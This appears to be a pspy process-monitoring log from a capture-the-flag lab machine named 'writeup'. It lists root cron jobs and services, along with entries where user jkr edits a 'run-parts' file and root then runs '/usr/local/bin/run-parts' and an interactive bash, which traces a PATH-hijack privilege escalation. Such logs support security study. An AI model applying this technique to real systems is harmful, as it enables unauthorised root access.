+2020/01/05 21:07:26 CMD: UID=0    PID=161    |                                       
+2020/01/05 21:07:26 CMD: UID=0    PID=16     |                                       
+2020/01/05 21:07:26 CMD: UID=0    PID=1563   | /usr/sbin/apache2 -k start            
+2020/01/05 21:07:26 CMD: UID=0    PID=155    |                                       
+2020/01/05 21:07:26 CMD: UID=0    PID=15     |                                       
+2020/01/05 21:07:26 CMD: UID=0    PID=1477   | /usr/lib/vmware-vgauth/VGAuthService -s                                                                                     
+2020/01/05 21:07:26 CMD: UID=0    PID=1444   | /usr/sbin/vmtoolsd                    
+2020/01/05 21:07:26 CMD: UID=0    PID=14     |                                       
+2020/01/05 21:07:26 CMD: UID=1000 PID=13970  | ./pspy64s                             
+2020/01/05 21:07:26 CMD: UID=0    PID=13956  |                                       
+2020/01/05 21:07:26 CMD: UID=0    PID=13940  |                                       
+2020/01/05 21:07:26 CMD: UID=1000 PID=13432  | -bash                                 
+2020/01/05 21:07:26 CMD: UID=1000 PID=13431  | sshd: jkr@pts/2                       
+2020/01/05 21:07:26 CMD: UID=0    PID=13425  | sshd: jkr [priv]                      
+2020/01/05 21:07:26 CMD: UID=33   PID=13313  | /usr/sbin/apache2 -k start            
+2020/01/05 21:07:26 CMD: UID=0    PID=13120  | -bash                                 
+2020/01/05 21:07:26 CMD: UID=0    PID=13114  | sshd: root@pts/0                      
+2020/01/05 21:07:26 CMD: UID=0    PID=1304   | /usr/sbin/rsyslogd                    
+2020/01/05 21:07:26 CMD: UID=0    PID=13032  | /usr/sbin/sshd                        
+2020/01/05 21:07:26 CMD: UID=0    PID=130    |                                       
+2020/01/05 21:07:26 CMD: UID=0    PID=13     |                                       
+2020/01/05 21:07:26 CMD: UID=1000 PID=12941  | nano run-parts                        
+2020/01/05 21:07:26 CMD: UID=0    PID=12939  | /bin/bash -i                          
+2020/01/05 21:07:26 CMD: UID=0    PID=12938  | bin/bash /usr/local/bin/run-parts --lsbsysinit /etc/update-motd.d                                                           
+2020/01/05 21:07:26 CMD: UID=0    PID=12937  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new             
+2020/01/05 21:07:26 CMD: UID=0    PID=12935  | sshd: jkr [priv]                      
+2020/01/05 21:07:26 CMD: UID=0    PID=128    |                                       
+2020/01/05 21:07:26 CMD: UID=0    PID=12     |                                       
+2020/01/05 21:07:26 CMD: UID=0    PID=115    |                                       
+2020/01/05 21:07:26 CMD: UID=0    PID=113    |                                       
+2020/01/05 21:07:26 CMD: UID=0    PID=111    |                                       
+2020/01/05 21:07:26 CMD: UID=0    PID=11     |                                       
+2020/01/05 21:07:26 CMD: UID=0    PID=109    |                                       
+2020/01/05 21:07:26 CMD: UID=0    PID=108    |                                       
+2020/01/05 21:07:26 CMD: UID=0    PID=107    |                                       
+2020/01/05 21:07:26 CMD: UID=0    PID=106    |                                       
+2020/01/05 21:07:26 CMD: UID=0    PID=105    |                                       
+2020/01/05 21:07:26 CMD: UID=0    PID=10     |                                       
+2020/01/05 21:07:26 CMD: UID=0    PID=1      | init [2]                              
+2020/01/05 21:08:01 CMD: UID=0    PID=13978  | /usr/sbin/CRON                        
+2020/01/05 21:08:01 CMD: UID=0    PID=13979  | /usr/sbin/CRON                        
+2020/01/05 21:08:01 CMD: UID=0    PID=13980  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 21:08:27 CMD: UID=0    PID=13981  |                                       
+2020/01/05 21:09:01 CMD: UID=0    PID=13982  | /usr/sbin/CRON                        
+2020/01/05 21:09:01 CMD: UID=0    PID=13983  | /usr/sbin/CRON                        
+2020/01/05 21:09:01 CMD: UID=0    PID=13984  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 21:10:01 CMD: UID=0    PID=13985  | /usr/sbin/CRON                        
+2020/01/05 21:10:01 CMD: UID=0    PID=13986  | /usr/sbin/CRON                        
+2020/01/05 21:10:01 CMD: UID=0    PID=13987  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 21:11:01 CMD: UID=0    PID=13988  | /usr/sbin/CRON                        
+2020/01/05 21:11:01 CMD: UID=0    PID=13989  | /usr/sbin/CRON                        
+2020/01/05 21:11:01 CMD: UID=0    PID=13990  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 21:12:01 CMD: UID=0    PID=13991  | /usr/sbin/CRON                        
+2020/01/05 21:12:01 CMD: UID=0    PID=13992  | /usr/sbin/CRON                        
+2020/01/05 21:12:01 CMD: UID=0    PID=13993  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 21:13:01 CMD: UID=0    PID=13994  | /usr/sbin/CRON                        
+2020/01/05 21:13:01 CMD: UID=0    PID=13995  | /usr/sbin/CRON                        
+2020/01/05 21:13:01 CMD: UID=0    PID=13996  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 21:13:39 CMD: UID=0    PID=13997  |                                       
+2020/01/05 21:14:01 CMD: UID=0    PID=13998  | /usr/sbin/CRON                        
+2020/01/05 21:14:01 CMD: UID=0    PID=13999  | /usr/sbin/CRON                        
+2020/01/05 21:14:01 CMD: UID=0    PID=14000  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 21:15:01 CMD: UID=0    PID=14001  | /usr/sbin/CRON                        
+2020/01/05 21:15:01 CMD: UID=0    PID=14002  | /usr/sbin/CRON                        
+2020/01/05 21:15:01 CMD: UID=0    PID=14003  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 21:16:01 CMD: UID=0    PID=14004  | /usr/sbin/CRON                        
+2020/01/05 21:16:01 CMD: UID=0    PID=14005  | /usr/sbin/CRON                        
+2020/01/05 21:16:01 CMD: UID=0    PID=14006  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 21:17:01 CMD: UID=0    PID=14008  | /usr/sbin/CRON                        
+2020/01/05 21:17:01 CMD: UID=0    PID=14007  | /usr/sbin/cron                        
+2020/01/05 21:17:01 CMD: UID=0    PID=14010  | /usr/sbin/CRON                        
+2020/01/05 21:17:01 CMD: UID=0    PID=14009  | /usr/sbin/CRON                        
+2020/01/05 21:17:01 CMD: UID=0    PID=14012  | /bin/sh -c    cd / && /bin/run-parts --report /etc/cron.hourly                                                              
+2020/01/05 21:17:01 CMD: UID=0    PID=14011  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 21:18:01 CMD: UID=0    PID=14013  | /usr/sbin/CRON                        
+2020/01/05 21:18:01 CMD: UID=0    PID=14014  | /usr/sbin/CRON                        
+2020/01/05 21:18:01 CMD: UID=0    PID=14015  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 21:18:50 CMD: UID=0    PID=14016  |                                       
+2020/01/05 21:19:01 CMD: UID=0    PID=14017  | /usr/sbin/CRON                        
+2020/01/05 21:19:02 CMD: UID=0    PID=14018  | /usr/sbin/CRON                        
+2020/01/05 21:19:02 CMD: UID=0    PID=14019  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 21:20:01 CMD: UID=0    PID=14020  | /usr/sbin/CRON                        
+2020/01/05 21:20:01 CMD: UID=0    PID=14021  | /usr/sbin/CRON                        
+2020/01/05 21:20:01 CMD: UID=0    PID=14022  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 21:21:01 CMD: UID=0    PID=14023  | /usr/sbin/CRON                        
+2020/01/05 21:21:01 CMD: UID=0    PID=14024  | /usr/sbin/CRON                        
+2020/01/05 21:21:01 CMD: UID=0    PID=14025  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 21:22:01 CMD: UID=0    PID=14026  | /usr/sbin/CRON                        
+2020/01/05 21:22:01 CMD: UID=0    PID=14027  | /usr/sbin/CRON                        
+2020/01/05 21:22:01 CMD: UID=0    PID=14028  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 21:23:01 CMD: UID=0    PID=14029  | /usr/sbin/CRON                        
+2020/01/05 21:23:01 CMD: UID=0    PID=14030  | /usr/sbin/CRON                        
+2020/01/05 21:23:01 CMD: UID=0    PID=14031  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 21:24:00 CMD: UID=0    PID=14032  |                                       
+2020/01/05 21:24:01 CMD: UID=0    PID=14033  | /usr/sbin/CRON                        
+2020/01/05 21:24:01 CMD: UID=0    PID=14034  | /usr/sbin/CRON                        
+2020/01/05 21:24:01 CMD: UID=0    PID=14035  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 21:25:01 CMD: UID=0    PID=14036  | /usr/sbin/CRON                        
+2020/01/05 21:25:01 CMD: UID=0    PID=14037  | /usr/sbin/CRON                        
+2020/01/05 21:25:01 CMD: UID=0    PID=14038  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 21:26:01 CMD: UID=0    PID=14039  | /usr/sbin/CRON                        
+2020/01/05 21:26:01 CMD: UID=0    PID=14040  | /usr/sbin/CRON                        
+2020/01/05 21:26:01 CMD: UID=0    PID=14041  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 21:27:01 CMD: UID=0    PID=14042  | /usr/sbin/CRON                        
+2020/01/05 21:27:01 CMD: UID=0    PID=14043  | /usr/sbin/CRON                        
+2020/01/05 21:27:01 CMD: UID=0    PID=14044  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 21:28:01 CMD: UID=0    PID=14045  | /usr/sbin/CRON                        
+2020/01/05 21:28:01 CMD: UID=0    PID=14046  | /usr/sbin/CRON                        
+2020/01/05 21:28:01 CMD: UID=0    PID=14047  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 21:29:01 CMD: UID=0    PID=14048  | /usr/sbin/CRON                        
+2020/01/05 21:29:01 CMD: UID=0    PID=14049  | /usr/sbin/CRON                        
+2020/01/05 21:29:01 CMD: UID=0    PID=14050  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 21:29:12 CMD: UID=0    PID=14051  |                                       
+2020/01/05 21:30:01 CMD: UID=0    PID=14052  | /usr/sbin/CRON                        
+2020/01/05 21:30:01 CMD: UID=0    PID=14053  | /usr/sbin/CRON                        
+2020/01/05 21:30:01 CMD: UID=0    PID=14054  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 21:31:01 CMD: UID=0    PID=14055  | /usr/sbin/CRON                        
+2020/01/05 21:31:01 CMD: UID=0    PID=14056  | /usr/sbin/CRON                        
+2020/01/05 21:31:01 CMD: UID=0    PID=14057  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 21:32:01 CMD: UID=0    PID=14058  | /usr/sbin/CRON                        
+2020/01/05 21:32:01 CMD: UID=0    PID=14059  | /usr/sbin/CRON                        
+2020/01/05 21:32:01 CMD: UID=0    PID=14060  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+^CExiting program... (interrupt)          
+jkr@writeup:/tmp$ ^C                      
+jkr@writeup:/tmp$ ./pspy64s               
+pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855        
+
+
+     ██▓███    ██████  ██▓███ ▓██   ██▓   
+    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒   
+    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░   
+    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░   
+    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░   
+    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒    
+    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░    
+    ░░       ░  ░  ░  ░░       ▒ ▒ ░░     
+                   ░           ░ ░        
+                               ░ ░        
+
+Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)                     
+Draining file system events due to startup...                                        
+done                                      
+2020/01/05 22:35:58 CMD: UID=0    PID=9      |                                       
+2020/01/05 22:35:58 CMD: UID=0    PID=85     |                                       
+2020/01/05 22:35:58 CMD: UID=0    PID=8      |                                       
+2020/01/05 22:35:58 CMD: UID=0    PID=78     |                                       
+2020/01/05 22:35:58 CMD: UID=0    PID=77     |                                       
+2020/01/05 22:35:58 CMD: UID=0    PID=76     |                                       
+2020/01/05 22:35:58 CMD: UID=0    PID=7      |                                       
+2020/01/05 22:35:58 CMD: UID=0    PID=5      |                                       
+2020/01/05 22:35:58 CMD: UID=0    PID=43     |                                       
+2020/01/05 22:35:58 CMD: UID=0    PID=42     |                                       
+2020/01/05 22:35:58 CMD: UID=0    PID=41     |                                       
+2020/01/05 22:35:58 CMD: UID=0    PID=395    |                                       
+2020/01/05 22:35:58 CMD: UID=1000 PID=3716   | -bash                                 
+2020/01/05 22:35:58 CMD: UID=1000 PID=3715   | sshd: jkr@pts/1                       
+2020/01/05 22:35:58 CMD: UID=0    PID=3708   | sshd: jkr [priv]                      
+2020/01/05 22:35:58 CMD: UID=0    PID=355    | udevd --daemon                        
+2020/01/05 22:35:58 CMD: UID=0    PID=3      |                                       
+2020/01/05 22:35:58 CMD: UID=0    PID=29     |                                       
+2020/01/05 22:35:58 CMD: UID=0    PID=28     |                                       
+2020/01/05 22:35:58 CMD: UID=0    PID=27     |                                       
+2020/01/05 22:35:58 CMD: UID=0    PID=26     |                                       
+2020/01/05 22:35:58 CMD: UID=33   PID=2563   | /usr/sbin/apache2 -k start            
+2020/01/05 22:35:58 CMD: UID=0    PID=25     |                                       
+2020/01/05 22:35:58 CMD: UID=33   PID=2460   | /usr/sbin/apache2 -k start            
+2020/01/05 22:35:58 CMD: UID=33   PID=2459   | /usr/sbin/apache2 -k start            
+2020/01/05 22:35:58 CMD: UID=33   PID=2458   | /usr/sbin/apache2 -k start            
+2020/01/05 22:35:58 CMD: UID=33   PID=2457   | /usr/sbin/apache2 -k start            
+2020/01/05 22:35:58 CMD: UID=33   PID=2424   | /usr/sbin/apache2 -k start            
+2020/01/05 22:35:58 CMD: UID=0    PID=24     |                                       
+2020/01/05 22:35:58 CMD: UID=33   PID=2369   | /usr/sbin/apache2 -k start            
+2020/01/05 22:35:58 CMD: UID=0    PID=23     |                                       
+2020/01/05 22:35:58 CMD: UID=0    PID=22     |                                       
+2020/01/05 22:35:58 CMD: UID=0    PID=2140   |                                       
+2020/01/05 22:35:58 CMD: UID=0    PID=21     |                                       
+2020/01/05 22:35:58 CMD: UID=0    PID=2044   | /sbin/getty 38400 tty6                
+2020/01/05 22:35:58 CMD: UID=0    PID=2043   | /sbin/getty 38400 tty5                
+2020/01/05 22:35:58 CMD: UID=0    PID=2042   | /sbin/getty 38400 tty4                
+2020/01/05 22:35:58 CMD: UID=0    PID=2041   | /sbin/getty 38400 tty3                
+2020/01/05 22:35:58 CMD: UID=0    PID=2040   | /sbin/getty 38400 tty2                
+2020/01/05 22:35:58 CMD: UID=0    PID=2039   | /sbin/getty 38400 tty1                
+2020/01/05 22:35:58 CMD: UID=0    PID=2      |                                       
+2020/01/05 22:35:58 CMD: UID=0    PID=1927   | logger -t mysqld -p daemon error      
+2020/01/05 22:35:58 CMD: UID=103  PID=1926   | /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/x86_64-linux-gnu/mariadb18/plugin --user=mysql --skip-log-error --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306                                                                  
+2020/01/05 22:35:58 CMD: UID=0    PID=19     |                                       
+2020/01/05 22:35:58 CMD: UID=0    PID=18     |                                       
+2020/01/05 22:35:58 CMD: UID=0    PID=1782   | /usr/bin/python3 /usr/bin/fail2ban-server -s /var/run/fail2ban/fail2ban.sock -p /var/run/fail2ban/fail2ban.pid -b           
+2020/01/05 22:35:58 CMD: UID=0    PID=1749   | /bin/bash /usr/bin/mysqld_safe        
+2020/01/05 22:35:58 CMD: UID=0    PID=17     |                                       
+2020/01/05 22:35:58 CMD: UID=0    PID=1678   | /usr/sbin/elogind -D                  
+2020/01/05 22:35:58 CMD: UID=101  PID=1638   | /usr/bin/dbus-daemon --system         
+2020/01/05 22:35:58 CMD: UID=0    PID=1622   | /usr/sbin/cron                        
+2020/01/05 22:35:58 CMD: UID=0    PID=162    |                                       
+2020/01/05 22:35:58 CMD: UID=0    PID=161    |                                       
+2020/01/05 22:35:58 CMD: UID=0    PID=16     |                                       
+2020/01/05 22:35:58 CMD: UID=0    PID=1563   | /usr/sbin/apache2 -k start            
+2020/01/05 22:35:58 CMD: UID=0    PID=155    |                                       
+2020/01/05 22:35:58 CMD: UID=0    PID=15     |                                       
+2020/01/05 22:35:58 CMD: UID=0    PID=1477   | /usr/lib/vmware-vgauth/VGAuthService -s                                                                                     
+2020/01/05 22:35:58 CMD: UID=0    PID=1444   | /usr/sbin/vmtoolsd                    
+2020/01/05 22:35:58 CMD: UID=1000 PID=14265  | ./pspy64s                             
+2020/01/05 22:35:58 CMD: UID=0    PID=14252  |                                       
+2020/01/05 22:35:58 CMD: UID=0    PID=14236  |                                       
+2020/01/05 22:35:58 CMD: UID=0    PID=14     |                                       
+2020/01/05 22:35:58 CMD: UID=1000 PID=13432  | -bash                                 
+2020/01/05 22:35:58 CMD: UID=1000 PID=13431  | sshd: jkr@pts/2                       
+2020/01/05 22:35:58 CMD: UID=0    PID=13425  | sshd: jkr [priv]                      
+2020/01/05 22:35:58 CMD: UID=33   PID=13313  | /usr/sbin/apache2 -k start            
+2020/01/05 22:35:58 CMD: UID=0    PID=13120  | -bash                                 
+2020/01/05 22:35:58 CMD: UID=0    PID=13114  | sshd: root@pts/0                      
+2020/01/05 22:35:58 CMD: UID=0    PID=1304   | /usr/sbin/rsyslogd                    
+2020/01/05 22:35:58 CMD: UID=0    PID=13032  | /usr/sbin/sshd                        
+2020/01/05 22:35:58 CMD: UID=0    PID=130    |                                       
+2020/01/05 22:35:58 CMD: UID=0    PID=13     |                                       
+2020/01/05 22:35:58 CMD: UID=1000 PID=12941  | nano run-parts                        
+2020/01/05 22:35:58 CMD: UID=0    PID=12939  | /bin/bash -i                          
+2020/01/05 22:35:58 CMD: UID=0    PID=12938  | bin/bash /usr/local/bin/run-parts --lsbsysinit /etc/update-motd.d                                                           
+2020/01/05 22:35:58 CMD: UID=0    PID=12937  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new             
+2020/01/05 22:35:58 CMD: UID=0    PID=12935  | sshd: jkr [priv]                      
+2020/01/05 22:35:58 CMD: UID=0    PID=128    |                                       
+2020/01/05 22:35:58 CMD: UID=0    PID=12     |                                       
+2020/01/05 22:35:58 CMD: UID=0    PID=115    |                                       
+2020/01/05 22:35:58 CMD: UID=0    PID=113    |                                       
+2020/01/05 22:35:58 CMD: UID=0    PID=111    |                                       
+2020/01/05 22:35:58 CMD: UID=0    PID=11     |                                       
+2020/01/05 22:35:58 CMD: UID=0    PID=109    |                                       
+2020/01/05 22:35:58 CMD: UID=0    PID=108    |                                       
+2020/01/05 22:35:58 CMD: UID=0    PID=107    |                                       
+2020/01/05 22:35:58 CMD: UID=0    PID=106    |                                       
+2020/01/05 22:35:58 CMD: UID=0    PID=105    |                                       
+2020/01/05 22:35:58 CMD: UID=0    PID=10     |                                       
+2020/01/05 22:35:58 CMD: UID=0    PID=1      | init [2]                              
+2020/01/05 22:36:01 CMD: UID=0    PID=14273  | /usr/sbin/CRON                        
+2020/01/05 22:36:01 CMD: UID=0    PID=14274  | /usr/sbin/CRON                        
+2020/01/05 22:36:01 CMD: UID=0    PID=14275  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 22:36:11 CMD: UID=0    PID=14276  | sshd: [accepted]                      
+2020/01/05 22:36:11 CMD: UID=102  PID=14277  | sshd: [net]                           
+2020/01/05 22:36:22 CMD: UID=0    PID=14278  | sshd: jkr [priv]                      
+2020/01/05 22:36:22 CMD: UID=0    PID=14279  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new             
+2020/01/05 22:36:22 CMD: UID=0    PID=14280  | run-parts --lsbsysinit /etc/update-motd.d                                                                                   
+2020/01/05 22:36:22 CMD: UID=0    PID=14281  | uname -rnsom                          
+2020/01/05 22:36:22 CMD: UID=0    PID=14282  | sshd: jkr [priv]                      
+2020/01/05 22:36:23 CMD: UID=1000 PID=14283  | sshd: jkr@pts/3                       
+2020/01/05 22:36:23 CMD: UID=1000 PID=14284  | -bash                                 
+2020/01/05 22:36:23 CMD: UID=1000 PID=14285  | -bash                                 
+2020/01/05 22:36:23 CMD: UID=1000 PID=14286  | -bash                                 
+2020/01/05 22:36:23 CMD: UID=1000 PID=14287  | -bash                                 
+2020/01/05 22:36:39 CMD: UID=0    PID=14288  |                                       
+2020/01/05 22:37:01 CMD: UID=0    PID=14289  | /usr/sbin/CRON                        
+2020/01/05 22:37:01 CMD: UID=0    PID=14290  | /usr/sbin/CRON                        
+2020/01/05 22:37:01 CMD: UID=0    PID=14291  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 22:38:01 CMD: UID=0    PID=14292  | /usr/sbin/CRON                        
+2020/01/05 22:38:01 CMD: UID=0    PID=14293  | /usr/sbin/CRON                        
+2020/01/05 22:38:01 CMD: UID=0    PID=14294  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 22:39:01 CMD: UID=0    PID=14295  | /usr/sbin/CRON                        
+2020/01/05 22:39:01 CMD: UID=0    PID=14296  | /usr/sbin/CRON                        
+2020/01/05 22:39:01 CMD: UID=0    PID=14297  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 22:40:01 CMD: UID=0    PID=14298  | /usr/sbin/CRON                        
+2020/01/05 22:40:01 CMD: UID=0    PID=14299  | /usr/sbin/CRON                        
+2020/01/05 22:40:01 CMD: UID=0    PID=14300  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 22:41:01 CMD: UID=0    PID=14301  | /usr/sbin/CRON                        
+2020/01/05 22:41:01 CMD: UID=0    PID=14302  | /usr/sbin/CRON                        
+2020/01/05 22:41:01 CMD: UID=0    PID=14303  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 22:41:51 CMD: UID=0    PID=14304  |                                       
+2020/01/05 22:42:01 CMD: UID=0    PID=14305  | /usr/sbin/CRON                        
+2020/01/05 22:42:01 CMD: UID=0    PID=14306  | /usr/sbin/CRON                        
+2020/01/05 22:42:01 CMD: UID=0    PID=14307  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 22:43:01 CMD: UID=0    PID=14308  | /usr/sbin/CRON                        
+2020/01/05 22:43:01 CMD: UID=0    PID=14309  | /usr/sbin/CRON                        
+2020/01/05 22:43:01 CMD: UID=0    PID=14310  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 22:44:01 CMD: UID=0    PID=14311  | /usr/sbin/CRON                        
+2020/01/05 22:44:01 CMD: UID=0    PID=14312  | /usr/sbin/CRON                        
+2020/01/05 22:44:01 CMD: UID=0    PID=14313  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 22:45:01 CMD: UID=0    PID=14314  | /usr/sbin/CRON                        
+2020/01/05 22:45:01 CMD: UID=0    PID=14315  | /usr/sbin/CRON                        
+2020/01/05 22:45:01 CMD: UID=0    PID=14316  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 22:46:01 CMD: UID=0    PID=14317  | /usr/sbin/CRON                        
+2020/01/05 22:46:01 CMD: UID=0    PID=14318  | /usr/sbin/CRON                        
+2020/01/05 22:46:01 CMD: UID=0    PID=14319  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 22:47:01 CMD: UID=0    PID=14320  | /usr/sbin/CRON                        
+2020/01/05 22:47:01 CMD: UID=0    PID=14321  | /usr/sbin/CRON                        
+2020/01/05 22:47:01 CMD: UID=0    PID=14322  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 22:47:02 CMD: UID=0    PID=14323  |                                       
+2020/01/05 22:48:01 CMD: UID=0    PID=14324  | /usr/sbin/CRON                        
+2020/01/05 22:48:01 CMD: UID=0    PID=14325  | /usr/sbin/CRON                        
+2020/01/05 22:48:01 CMD: UID=0    PID=14326  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 22:49:01 CMD: UID=0    PID=14327  | /usr/sbin/CRON                        
+2020/01/05 22:49:01 CMD: UID=0    PID=14328  | /usr/sbin/CRON                        
+2020/01/05 22:49:01 CMD: UID=0    PID=14329  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 22:50:01 CMD: UID=0    PID=14330  | /usr/sbin/CRON                        
+2020/01/05 22:50:01 CMD: UID=0    PID=14331  | /usr/sbin/CRON                        
+2020/01/05 22:50:01 CMD: UID=0    PID=14332  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 22:51:01 CMD: UID=0    PID=14333  | /usr/sbin/CRON                        
+2020/01/05 22:51:01 CMD: UID=0    PID=14334  | /usr/sbin/CRON                        
+2020/01/05 22:51:01 CMD: UID=0    PID=14335  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 22:52:01 CMD: UID=0    PID=14336  | /usr/sbin/CRON                        
+2020/01/05 22:52:01 CMD: UID=0    PID=14337  | /usr/sbin/CRON                        
+2020/01/05 22:52:01 CMD: UID=0    PID=14338  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 22:52:12 CMD: UID=0    PID=14339  |                                       
+2020/01/05 22:53:01 CMD: UID=0    PID=14340  | /usr/sbin/CRON                        
+2020/01/05 22:53:01 CMD: UID=0    PID=14341  | /usr/sbin/CRON                        
+2020/01/05 22:53:01 CMD: UID=0    PID=14342  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 22:54:01 CMD: UID=0    PID=14343  | /usr/sbin/CRON                        
+2020/01/05 22:54:01 CMD: UID=0    PID=14344  | /usr/sbin/CRON                        
+2020/01/05 22:54:01 CMD: UID=0    PID=14345  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 22:55:01 CMD: UID=0    PID=14346  | /usr/sbin/CRON                        
+2020/01/05 22:55:01 CMD: UID=0    PID=14347  | /usr/sbin/CRON                        
+2020/01/05 22:55:01 CMD: UID=0    PID=14348  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 22:56:01 CMD: UID=0    PID=14349  | /usr/sbin/CRON                        
+2020/01/05 22:56:01 CMD: UID=0    PID=14350  | /usr/sbin/CRON                        
+2020/01/05 22:56:01 CMD: UID=0    PID=14351  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 22:57:01 CMD: UID=0    PID=14352  | /usr/sbin/CRON                        
+2020/01/05 22:57:01 CMD: UID=0    PID=14353  | /usr/sbin/CRON                        
+2020/01/05 22:57:01 CMD: UID=0    PID=14354  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 22:57:24 CMD: UID=0    PID=14355  |                                       
+2020/01/05 22:58:01 CMD: UID=0    PID=14356  | /usr/sbin/CRON                        
+2020/01/05 22:58:01 CMD: UID=0    PID=14357  | /usr/sbin/CRON                        
+2020/01/05 22:58:01 CMD: UID=0    PID=14358  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 22:59:01 CMD: UID=0    PID=14359  | /usr/sbin/CRON                        
+2020/01/05 22:59:01 CMD: UID=0    PID=14360  | /usr/sbin/CRON                        
+2020/01/05 22:59:01 CMD: UID=0    PID=14361  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 23:00:01 CMD: UID=0    PID=14362  | /usr/sbin/CRON                        
+2020/01/05 23:00:01 CMD: UID=0    PID=14363  | /usr/sbin/CRON                        
+2020/01/05 23:00:01 CMD: UID=0    PID=14364  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 23:01:01 CMD: UID=0    PID=14365  | /usr/sbin/CRON                        
+2020/01/05 23:01:01 CMD: UID=0    PID=14366  | /usr/sbin/CRON                        
